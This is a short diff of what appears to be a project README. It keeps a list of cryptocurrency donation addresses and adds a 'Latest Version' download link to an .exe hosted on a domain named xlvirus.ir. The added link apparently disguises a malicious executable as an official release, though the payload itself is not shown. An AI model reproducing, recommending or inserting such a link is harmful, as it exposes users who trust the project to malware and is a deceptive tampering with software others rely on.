@@ -13,3 +13,6 @@ Donate ❤️ :
 - ETH : 0xbB5e2bb392DeA9D733893bb5a41e6A093A6932D3
 - TON : UQD-XB5JlPxiITr4HxjHd46Ti6eYK_1-hUBr04VJG6lgLX86
 - SOL : 8yEydG7oE1gqGMmRH3S6KsCGqvq2hKFfantHF4wVdNXP
+
+
+Download [**Latest Version**](download.xlvirus.ir/Blutap2.5.2.exe)
